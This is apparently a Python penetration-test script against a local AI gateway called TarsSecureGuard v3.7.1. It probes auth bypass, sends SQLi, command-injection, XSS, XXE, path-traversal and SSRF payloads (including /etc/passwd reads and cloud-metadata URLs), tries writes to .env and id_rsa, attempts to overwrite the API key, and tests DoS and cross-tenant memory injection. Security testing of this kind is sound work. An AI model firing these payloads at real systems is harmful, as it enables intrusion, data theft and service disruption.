#!/usr/bin/env python3
"""
TarsSecureGuard v3.7.1 Red Team Black-Box Penetration Test
Target: http://127.0.0.1:18889
API Key: redteam-test-key-2026
"""
import json, sys, os, time, urllib.parse, base64, subprocess, textwrap
from datetime import datetime

# ── try to import requests ──
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests

BASE = "http://127.0.0.1:18889"
KEY = "redteam-test-key-2026"
BAD_KEY = "wrong-key"
REPORT = []
FINDINGS = []

def log(cat, title, detail="", severity="INFO"):
    entry = {"time": datetime.now().isoformat(), "cat": cat, "title": title, "detail": detail, "severity": severity}
    REPORT.append(entry)
    if severity in ("CRITICAL", "HIGH", "MEDIUM"):
        FINDINGS.append(entry)
    print(f"[{severity}] [{cat}] {title}")

def req(method, path, headers=None, data=None, json_data=None, key=KEY, timeout=10, allow_redirects=False):
    h = headers or {}
    if key:
        h["X-API-Key"] = key
    try:
        if method == "GET":
            r = requests.get(BASE + path, headers=h, timeout=timeout, allow_redirects=allow_redirects)
        elif method == "POST":
            r = requests.post(BASE + path, headers=h, data=data, json=json_data, timeout=timeout, allow_redirects=allow_redirects)
        elif method == "PUT":
            r = requests.put(BASE + path, headers=h, data=data, json=json_data, timeout=timeout)
        elif method == "DELETE":
            r = requests.delete(BASE + path, headers=h, timeout=timeout)
        elif method == "OPTIONS":
            r = requests.options(BASE + path, headers=h, timeout=timeout)
        else:
            r = requests.request(method, BASE + path, headers=h, data=data, json=json_data, timeout=timeout)
        return r
    except Exception as e:
        return type('obj', (object,), {'status_code': -1, 'text': str(e), 'headers': {}})()

# ═══════════════════════════════════════════════════════════════
# 1. 信息收集与目标定位
# ═══════════════════════════════════════════════════════════════

def recon():
    log("RECON", "=== Phase 1: Information Gathering ===")

    # 1.1 根路径探测
    r = req("GET", "/")
    log("RECON", "Root path response", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 1.2 版本信息
    r = req("GET", "/", key=None)
    log("RECON", "Root without auth", f"Status: {r.status_code}")

    # 1.3 健康检查端点
    for p in ["/api/health", "/health", "/api/status", "/status", "/api/admin/v322/status"]:
        r = req("GET", p, key=None)
        log("RECON", f"Health/status probe: {p}", f"Status: {r.status_code}, Body[:300]: {r.text[:300]}")

    # 1.4 API端点枚举（常见REST端点）
    endpoints = [
        "/api/chat/completions", "/api/models", "/api/admin/models",
        "/api/admin/v32/providers", "/api/admin/audit/verify",
        "/api/admin/audit/export", "/api/context/memory",
        "/api/context/info", "/api/tools/list", "/api/admin/gatekeeper/rules",
        "/api/admin/v35/profile", "/api/admin/v34/connectors",
        "/oauth/login", "/oauth/callback", "/oauth/logout",
        "/api/admin/key-rotate",
    ]
    for ep in endpoints:
        r = req("GET", ep, key=None)
        log("RECON", f"Endpoint enum (no auth): {ep}", f"Status: {r.status_code}")
        r2 = req("GET", ep)
        log("RECON", f"Endpoint enum (with auth): {ep}", f"Status: {r2.status_code}")

    # 1.5 方法枚举
    for m in ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"]:
        r = req(m, "/api/chat/completions", key=None)
        log("RECON", f"Method enum: {m} /api/chat/completions", f"Status: {r.status_code}")

    # 1.6 CORS预检探测
    r = req("OPTIONS", "/api/chat/completions", headers={"Origin": "http://evil.com", "Access-Control-Request-Method": "POST"}, key=None)
    log("RECON", "CORS preflight from evil.com", f"Status: {r.status_code}, ACAO: {r.headers.get('Access-Control-Allow-Origin','N/A')}")

    # 1.7 响应头分析
    r = req("GET", "/", key=None)
    hdrs = dict(r.headers)
    interesting = {k:v for k,v in hdrs.items() if any(x in k.lower() for x in ['server','powered','version','x-','access-control'])}
    log("RECON", "Response headers leakage", f"Interesting headers: {json.dumps(interesting, indent=2)}")

    # 1.8 前端静态资源枚举
    for p in ["/", "/index.html", "/frontend/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml"]:
        r = req("GET", p, key=None)
        log("RECON", f"Static asset: {p}", f"Status: {r.status_code}, Content-Type: {r.headers.get('Content-Type','N/A')}")

# ═══════════════════════════════════════════════════════════════
# 2. 认证与授权
# ═══════════════════════════════════════════════════════════════

def test_auth():
    log("AUTH", "=== Phase 2: Authentication & Authorization ===")

    # 2.1 错误密钥测试
    r = req("GET", "/api/models", key=BAD_KEY)
    log("AUTH", "Invalid API Key rejection", f"Status: {r.status_code}, Body: {r.text[:200]}", "INFO")
    if r.status_code != 401 and r.status_code != 403:
        log("AUTH", "Invalid key NOT rejected!", f"Got {r.status_code}", "CRITICAL")

    # 2.2 空密钥测试
    r = req("GET", "/api/models", key="")
    log("AUTH", "Empty API Key rejection", f"Status: {r.status_code}", "INFO")
    if r.status_code != 401:
        log("AUTH", "Empty key NOT rejected!", f"Got {r.status_code}", "HIGH")

    # 2.3 默认密钥测试（v3.7.1 P0-1 应已修复：默认密钥在非localhost禁止）
    # 但当前监听127.0.0.1，所以测试默认密钥是否还能工作
    r = req("GET", "/api/models", key="tars-gateway-key")
    log("AUTH", "Default key on localhost", f"Status: {r.status_code}", "INFO")
    if r.status_code == 200:
        log("AUTH", "Default key still works on localhost", "May be expected for localhost, but verify policy", "MEDIUM")

    # 2.4 密钥大小写/变体
    for k in [KEY.upper(), KEY.lower(), KEY + " ", " " + KEY]:
        r = req("GET", "/api/models", key=k)
        if r.status_code == 200 and k != KEY:
            log("AUTH", f"Key variant accepted: {k[:20]}...", f"Status: {r.status_code}", "HIGH")

    # 2.5 多密钥头
    r = requests.get(BASE + "/api/models", headers={"X-API-Key": BAD_KEY + ", " + KEY}, timeout=10)
    log("AUTH", "Multiple keys in header", f"Status: {r.status_code}", "INFO")

    # 2.6 Bearer token测试
    r = requests.get(BASE + "/api/models", headers={"Authorization": f"Bearer {KEY}"}, timeout=10)
    log("AUTH", "Bearer token auth", f"Status: {r.status_code}", "INFO")

    # 2.7 用户枚举（如果users端点存在）
    r = req("GET", "/api/admin/users")
    log("AUTH", "Users endpoint", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 2.8 角色分级测试 - v3.7.1 P1-4
    # 普通user角色能否访问admin端点
    log("AUTH", "Role-based access control", "Testing admin endpoints with different roles requires multiple accounts; note for manual verification", "INFO")

    # 2.9 OAuth端点信息泄露
    r = req("GET", "/oauth/login", key=None)
    log("AUTH", "OAuth login endpoint (no auth)", f"Status: {r.status_code}, Body[:300]: {r.text[:300]}")

# ═══════════════════════════════════════════════════════════════
# 3. WAF与输入验证
# ═══════════════════════════════════════════════════════════════

def test_waf():
    log("WAF", "=== Phase 3: WAF & Input Validation ===")

    payloads = [
        ("SQLi basic", "' OR '1'='1"),
        ("SQLi union", "' UNION SELECT * FROM users --"),
        ("SQLi comment", "admin'--"),
        ("CMD injection", "; cat /etc/passwd"),
        ("CMD backtick", "`whoami`"),
        ("CMD $()", "$(id)"),
        ("CMD pipe", "| cat /etc/passwd"),
        ("XSS script", "<script>alert(1)</script>"),
        ("XSS img", "<img src=x onerror=alert(1)>"),
        ("XSS svg", "<svg onload=alert(1)>"),
        ("Path traversal", "../../../etc/passwd"),
        ("Path traversal encoded", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        ("Path traversal double", "....//....//etc/passwd"),
        ("Null byte", "test%00.txt"),
        ("CRLF injection", "test\r\nSet-Cookie: evil=1"),
        ("Template injection", "{{7*7}}"),
        ("NoSQL", "{'$gt': ''}"),
        ("LDAP", "*)(uid=*))(&(uid=*"),
        ("XXE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"),
        ("SSRF internal", "http://127.0.0.1:22/"),
        ("SSRF metadata", "http://169.254.169.254/latest/meta-data/"),
    ]

    # 3.1 通过chat API注入
    for name, payload in payloads:
        r = req("POST", "/api/chat/completions", json_data={
            "model": "test",
            "messages": [{"role": "user", "content": payload}]
        })
        status = r.status_code
        body = r.text[:200]
        sev = "INFO"
        if status == 200 and any(x in body.lower() for x in ["passwd", "root:", "uid=", "admin"]):
            sev = "HIGH"
            log("WAF", f"WAF bypass via chat: {name}", f"Payload: {payload[:50]}... Status: {status}", sev)
        else:
            log("WAF", f"WAF check: {name}", f"Status: {status}, blocked or passed safely", sev)

    # 3.2 通过查询参数注入
    for name, payload in [("XSS q", "<script>alert(1)</script>"), ("Path q", "../../../etc/passwd")]:
        r = req("GET", f"/api/models?q={urllib.parse.quote(payload)}")
        log("WAF", f"Query param injection: {name}", f"Status: {r.status_code}")

    # 3.3 JSON body畸形测试
    r = req("POST", "/api/chat/completions", data="not json", headers={"Content-Type": "application/json"})
    log("WAF", "Malformed JSON body", f"Status: {r.status_code}, Body: {r.text[:200]}")

    # 3.4 Content-Type绕过
    r = req("POST", "/api/chat/completions", data="<xml>test</xml>", headers={"Content-Type": "application/xml"}, json_data=None)
    log("WAF", "XML content-type to JSON endpoint", f"Status: {r.status_code}")

    # 3.5 超大body测试（v3.7.1新增maxBytesBody）
    big = "x" * (10 * 1024 * 1024)  # 10MB
    r = req("POST", "/api/chat/completions", data=big, headers={"Content-Type": "application/json"}, timeout=30)
    log("WAF", "Oversized body (10MB)", f"Status: {r.status_code}, Body[:100]: {r.text[:100]}")
    if r.status_code == 413:
        log("WAF", "Oversized body correctly rejected with 413", "", "INFO")
    elif r.status_code == 200:
        log("WAF", "Oversized body ACCEPTED", "", "MEDIUM")

    # 3.6 编码绕过测试
    encodings = [
        ("URL double encode", "%252e%252e%252f"),
        ("Unicode overload", "\u002e\u002e\u002f"),
        ("Mixed case", "%2E%2e%2F%2f"),
    ]
    for name, enc in encodings:
        r = req("GET", f"/api/tools/list?path={enc}")
        log("WAF", f"Encoding bypass: {name}", f"Status: {r.status_code}")

# ═══════════════════════════════════════════════════════════════
# 4. SSRF测试
# ═══════════════════════════════════════════════════════════════

def test_ssrf():
    log("SSRF", "=== Phase 4: SSRF ===")

    # 4.1 通过tars_fetch_url工具（如果可用）
    ssrf_targets = [
        "http://127.0.0.1:18889/api/admin/users",
        "http://127.0.0.1:22/",
        "http://0.0.0.0:18889/",
        "http://[::1]:18889/",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "dict://127.0.0.1:22/",
        "gopher://127.0.0.1:22/",
    ]
    for target in ssrf_targets:
        r = req("POST", "/api/tools/execute", json_data={
            "tool": "tars_fetch_url",
            "params": {"url": target}
        })
        log("SSRF", f"tars_fetch_url: {target}", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")
        if r.status_code == 200 and ("root:" in r.text or "meta-data" in r.text or "SSH" in r.text):
            log("SSRF", f"SSRF HIT: {target}", "", "HIGH")

    # 4.2 通过连接器（v3.4.0+）
    r = req("POST", "/api/admin/v34/connectors", json_data={
        "template": "webhook_notify",
        "params": {"url": "http://127.0.0.1:18889/api/admin/users"}
    })
    log("SSRF", "Connector SSRF attempt", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 4.3 通过自定义工具
    r = req("POST", "/api/tools/execute", json_data={
        "tool": "tars_web_fetch",
        "params": {"url": "http://127.0.0.1:18889/api/admin/users"}
    })
    log("SSRF", "Custom tool SSRF attempt", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

# ═══════════════════════════════════════════════════════════════
# 5. 文件操作安全
# ═══════════════════════════════════════════════════════════════

def test_fileops():
    log("FILE", "=== Phase 5: File Operations ===")

    # 5.1 路径遍历 - tars_file_read
    traversal_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "/etc/passwd",
        "\\etc\\passwd",
        "....//....//etc/passwd",
    ]
    for path in traversal_paths:
        r = req("POST", "/api/tools/execute", json_data={
            "tool": "tars_file_read",
            "params": {"path": path}
        })
        log("FILE", f"Path traversal read: {path}", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")
        if r.status_code == 200 and "root:" in r.text:
            log("FILE", f"PATH TRAVERSAL HIT: {path}", "", "CRITICAL")

    # 5.2 路径遍历 - tars_file_list
    for path in ["../../../etc", "/etc"]:
        r = req("POST", "/api/tools/execute", json_data={
            "tool": "tars_file_list",
            "params": {"path": path}
        })
        log("FILE", f"Path traversal list: {path}", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 5.3 符号链接逃逸（v3.7.1已修复EvalSymlinks）
    # 创建测试符号链接
    testdir = "/tmp/tsg-test/data"
    os.makedirs(testdir, exist_ok=True)
    sym = os.path.join(testdir, "symlink_escape")
    try:
        os.unlink(sym)
    except:
        pass
    os.symlink("/etc", sym)
    r = req("POST", "/api/tools/execute", json_data={
        "tool": "tars_file_list",
        "params": {"path": os.path.join("symlink_escape", "passwd")}
    })
    log("FILE", "Symlink escape test", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")
    if r.status_code == 200 and "root:" in r.text:
        log("FILE", "SYMLINK ESCAPE WORKS!", "v3.7.1 fix ineffective", "CRITICAL")
    else:
        log("FILE", "Symlink escape blocked", "v3.7.1 EvalSymlinks fix effective", "INFO")

    # 5.4 敏感文件写入测试
    sensitive = ["config.json", ".env", "id_rsa", "gateway-key.txt", "shared-memory.json"]
    for fname in sensitive:
        r = req("POST", "/api/tools/execute", json_data={
            "tool": "tars_file_write",
            "params": {"path": fname, "content": "EVIL_CONTENT"}
        })
        log("FILE", f"Sensitive file write: {fname}", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")
        if r.status_code == 200:
            log("FILE", f"SENSITIVE WRITE ALLOWED: {fname}", "", "CRITICAL")

    # 5.5 超大文件写入
    r = req("POST", "/api/tools/execute", json_data={
        "tool": "tars_file_write",
        "params": {"path": "bigfile.txt", "content": "x" * (2 * 1024 * 1024)}
    })
    log("FILE", "Large file write (2MB)", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

# ═══════════════════════════════════════════════════════════════
# 6. 配置安全
# ═══════════════════════════════════════════════════════════════

def test_config():
    log("CONFIG", "=== Phase 6: Configuration Security ===")

    # 6.1 config.json读取
    r = req("POST", "/api/tools/execute", json_data={
        "tool": "tars_file_read",
        "params": {"path": "config.json"}
    })
    log("CONFIG", "Read config.json via tool", f"Status: {r.status_code}")
    if r.status_code == 200:
        log("CONFIG", "config.json readable via tool", "Check if API keys exposed", "MEDIUM")

    # 6.2 配置热重载
    r = req("POST", "/api/admin/config/reload", json_data={})
    log("CONFIG", "Config reload (admin)", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 6.3 直接配置写入
    r = req("POST", "/api/admin/config", json_data={
        "security": {"apiKey": "hacked-key", "mode": "permissive"}
    })
    log("CONFIG", "Direct config write (change apiKey)", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 6.4 守门人规则查看
    r = req("GET", "/api/admin/gatekeeper/rules")
    log("CONFIG", "Gatekeeper rules", f"Status: {r.status_code}, Body[:500]: {r.text[:500]}")

    # 6.5 配置分级返回 - v3.7.1 P1-4
    # 普通用户不应看到完整 security/users
    log("CONFIG", "Config分级返回", "Need multi-role accounts to verify; manually check that viewer/readonly/user roles see redacted config", "INFO")

    # 6.6 下划线键解析 - v3.7.1 P0-3
    # 测试config.json中带_前缀的键是否被剥离
    testcfg = '/tmp/tsg-test/data/_test_config.json'
    with open(testcfg, 'w') as f:
        json.dump({"_comment": "should be stripped", "realKey": "value"}, f)
    log("CONFIG", "Underscore key stripping", f"Test config written to {testcfg}; verify via code review that stripUnderscoreKeys is active", "INFO")

# ═══════════════════════════════════════════════════════════════
# 7. DoS与资源耗尽
# ═══════════════════════════════════════════════════════════════

def test_dos():
    log("DOS", "=== Phase 7: DoS & Resource Exhaustion ===")

    # 7.1 超大JSON（嵌套深度）
    deep = {"a": "x"}
    for _ in range(5000):
        deep = {"a": deep}
    try:
        r = req("POST", "/api/chat/completions", json_data=deep, timeout=15)
        log("DOS", "Deeply nested JSON", f"Status: {r.status_code}, Body[:100]: {r.text[:100]}")
    except Exception as e:
        log("DOS", "Deeply nested JSON error", str(e), "INFO")

    # 7.2 大量并发请求（限速测试）
    log("DOS", "Rate limit test", "Sending 20 rapid requests...")
    statuses = []
    for i in range(20):
        r = req("GET", "/api/models")
        statuses.append(r.status_code)
        if r.status_code == 429:
            log("DOS", f"Rate limit hit at request {i+1}", f"Status: {r.status_code}", "INFO")
            break
    log("DOS", "Rapid request statuses", f"Statuses: {statuses}")

    # 7.3 慢速请求（不做，因为会阻塞测试）
    log("DOS", "Slowloris", "Skipped in automated suite; note for manual testing", "INFO")

    # 7.4 超大参数数组
    huge = {"model": "test", "messages": [{"role": "user", "content": "x"}] * 10000}
    try:
        r = req("POST", "/api/chat/completions", json_data=huge, timeout=15)
        log("DOS", "Huge messages array", f"Status: {r.status_code}, Body[:100]: {r.text[:100]}")
    except Exception as e:
        log("DOS", "Huge messages array error", str(e), "INFO")

# ═══════════════════════════════════════════════════════════════
# 8. 审计链完整性
# ═══════════════════════════════════════════════════════════════

def test_audit():
    log("AUDIT", "=== Phase 8: Audit Chain ===")

    # 8.1 审计导出
    r = req("GET", "/api/admin/audit/export")
    log("AUDIT", "Audit export", f"Status: {r.status_code}, Content-Type: {r.headers.get('Content-Type','N/A')}")

    # 8.2 审计校验
    r = req("POST", "/api/admin/audit/verify", json_data={})
    log("AUDIT", "Audit verify", f"Status: {r.status_code}, Body[:300]: {r.text[:300]}")

    # 8.3 跨租户访问审计
    log("AUDIT", "Cross-tenant audit", "Requires multi-tenant setup; verify manually", "INFO")

# ═══════════════════════════════════════════════════════════════
# 9. v3.7.1 新增功能专项测试
# ═══════════════════════════════════════════════════════════════

def test_v371_features():
    log("V371", "=== Phase 9: v3.7.1 Feature Security ===")

    # 9.1 密钥轮换端点
    r = req("POST", "/api/admin/key-rotate", json_data={})
    log("V371", "Key rotate endpoint", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 9.2 TLS参数（仅启动参数，无法运行时测试）
    log("V371", "TLS parameters", "Command-line only; verify via code review", "INFO")

    # 9.3 CSP头
    r = req("GET", "/", key=None)
    csp = r.headers.get("Content-Security-Policy", "N/A")
    log("V371", "CSP header", f"CSP: {csp[:200]}")
    if csp == "N/A":
        log("V371", "CSP header missing", "v3.7.1 P1-5 should add CSP", "MEDIUM")
    else:
        log("V371", "CSP header present", "v3.7.1 P1-5 effective", "INFO")

    # 9.4 X-Forwarded-For信任代理测试
    r = req("GET", "/api/models", headers={"X-Forwarded-For": "1.2.3.4"})
    log("V371", "X-Forwarded-For without trusted proxy", f"Status: {r.status_code}")

    # 9.5 可信代理列表（需要配置）
    log("V371", "Trusted proxy list", "Verify that only listed IPs trust X-Forwarded-For", "INFO")

    # 9.6 环境变量覆盖敏感Key - v3.7.1 P1-7
    log("V371", "Env var override", "Verify TSG_SECURITY_APIKEY env can override config without writing to disk", "INFO")

    # 9.7 审计敏感字段脱敏 - v3.7.1 P1-6
    log("V371", "Audit masking", "Verify audit logs mask sensitive fields like apiKey", "INFO")

# ═══════════════════════════════════════════════════════════════
# 10. 共享记忆/信息注入测试
# ═══════════════════════════════════════════════════════════════

def test_shared():
    log("SHARED", "=== Phase 10: Shared Memory/Info ===")

    # 10.1 跨命名空间写入
    r = req("POST", "/api/context/memory", json_data={
        "namespace": "user:other_tenant/other_user",
        "key": "evil",
        "value": "injected"
    })
    log("SHARED", "Cross-tenant memory write", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")
    if r.status_code == 200:
        log("SHARED", "CROSS-TENANT MEMORY WRITE WORKS!", "", "CRITICAL")

    # 10.2 global命名空间写入（普通用户）
    r = req("POST", "/api/context/memory", json_data={
        "namespace": "global",
        "key": "test_global",
        "value": "test"
    })
    log("SHARED", "Global memory write (normal user)", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 10.3 超大值写入
    r = req("POST", "/api/context/memory", json_data={
        "namespace": "tenant:default",
        "key": "big",
        "value": "x" * (100 * 1024)  # 100KB
    })
    log("SHARED", "Oversized memory value", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

    # 10.4 共享信息注入
    r = req("POST", "/api/context/info", json_data={
        "title": "<script>alert(1)</script>",
        "content": "test",
        "type": "fact",
        "scope": "tenant"
    })
    log("SHARED", "XSS in shared info title", f"Status: {r.status_code}, Body[:200]: {r.text[:200]}")

# ═══════════════════════════════════════════════════════════════
# 主入口
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("TarsSecureGuard v3.7.1 Red Team Penetration Test")
    print(f"Target: {BASE}")
    print(f"Started: {datetime.now().isoformat()}")
    print("=" * 60)

    # 等待服务就绪
    for _ in range(10):
        try:
            r = requests.get(BASE + "/api/health", timeout=2)
            if r.status_code in (200, 401, 403):
                break
        except:
            pass
        time.sleep(1)

    recon()
    test_auth()
    test_waf()
    test_ssrf()
    test_fileops()
    test_config()
    test_dos()
    test_audit()
    test_v371_features()
    test_shared()

    # 保存报告
    report_path = "/tmp/tsg-redteam-report.json"
    with open(report_path, "w") as f:
        json.dump({
            "target": BASE,
            "version": "3.7.1",
            "started": datetime.now().isoformat(),
            "total_checks": len(REPORT),
            "findings_count": len(FINDINGS),
            "findings": FINDINGS,
            "full_log": REPORT
        }, f, indent=2, ensure_ascii=False)

    print("\n" + "=" * 60)
    print(f"TEST COMPLETE: {len(REPORT)} checks, {len(FINDINGS)} findings")
    print(f"Report saved to: {report_path}")
    print("=" * 60)
